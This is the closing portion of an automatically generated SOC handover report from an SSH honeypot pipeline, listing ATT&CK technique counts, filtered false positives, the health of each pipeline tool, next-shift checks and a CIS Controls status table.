| [T1057](https://attack.mitre.org/techniques/T1057) | 1 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 1 |

---

## 🔕 False Positive Summary (22 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 6 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 15 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 131 cases |
| Tool 34  | Credential Extractor        | ✅ 86 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 10 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 77 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 22 filtered (16.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 51 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 32 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 53 priority case(s) shown individually · 18 recon entry/entries in table (11 group(s) consolidating 49 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-13T22:59:07Z_
